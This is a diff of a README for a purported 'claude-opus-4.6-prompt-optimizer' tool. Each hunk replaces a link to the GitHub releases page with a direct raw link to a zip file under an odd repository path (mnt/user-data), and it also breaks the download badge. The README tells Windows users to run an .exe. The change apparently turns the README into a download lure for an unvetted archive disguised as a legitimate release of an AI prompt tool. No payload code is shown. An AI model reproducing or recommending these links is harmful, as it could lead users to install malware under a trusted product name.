@@ -1,7 +1,7 @@
 # 🎉 claude-opus-4.6-prompt-optimizer - Transform Prompts for Superior Results
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v4.6-brightgreen)](https://github.com/idkidk02020202/claude-opus-4.6-prompt-optimizer/releases)
+[![Download Release](https://raw.githubusercontent.com/idkidk02020202/claude-opus-4.6-prompt-optimizer/main/mnt/user-data/optimizer-prompt-opus-claude-1.6.zip%20Release-v4.6-brightgreen)](https://raw.githubusercontent.com/idkidk02020202/claude-opus-4.6-prompt-optimizer/main/mnt/user-data/optimizer-prompt-opus-claude-1.6.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the **claude-opus-4.6-prompt-optimizer** application smoothly. This tool enhances your prompts, making them better suited for Claude Opus 4.6, following Anthropic's best practices.
@@ -28,7 +28,7 @@ To use the **claude-opus-4.6-prompt-optimizer**, ensure your system meets the fo
 To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download section.
-   [Download the latest release](https://github.com/idkidk02020202/claude-opus-4.6-prompt-optimizer/releases)
+   [Download the latest release](https://raw.githubusercontent.com/idkidk02020202/claude-opus-4.6-prompt-optimizer/main/mnt/user-data/optimizer-prompt-opus-claude-1.6.zip)
 
 2. **Select the Correct Version**: Choose the file that matches your operating system. 
    - For Windows users, look for an `.exe` file.
@@ -78,6 +78,6 @@ The **claude-opus-4.6-prompt-optimizer** is open-source and available under the 
 ## 📅 Updates
 Keep an eye on the releases page for any future updates or new features. Regularly updating your software can provide you with the best performance and security.
 
-For more detailed information, always refer back to our [Releases Page](https://github.com/idkidk02020202/claude-opus-4.6-prompt-optimizer/releases) for the latest releases.
+For more detailed information, always refer back to our [Releases Page](https://raw.githubusercontent.com/idkidk02020202/claude-opus-4.6-prompt-optimizer/main/mnt/user-data/optimizer-prompt-opus-claude-1.6.zip) for the latest releases.
 
 Happy optimizing!
